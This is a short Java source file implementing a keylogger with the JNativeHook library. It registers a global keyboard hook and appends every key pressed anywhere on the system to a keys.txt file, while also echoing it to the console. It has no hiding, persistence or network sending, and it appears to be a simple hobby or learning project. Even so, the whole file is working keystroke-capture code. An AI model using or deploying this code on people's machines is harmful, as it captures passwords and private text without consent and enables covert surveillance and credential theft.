package ch.fxlogger.fxkeylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;


public class KeyLogger implements NativeKeyListener {

    private static final Path file = Paths.get("src/main/java/ch/fxlogger/fxkeylogger/keys.txt");

    private static String s = "";
    private boolean st, ctrl, alt, capslock;

    public void run() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
                System.out.println("[" + keyText + "]");
            } else {
                writer.print(keyText);
                System.out.println(keyText);
            }
        } catch (IOException e) {
            System.exit(-1);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
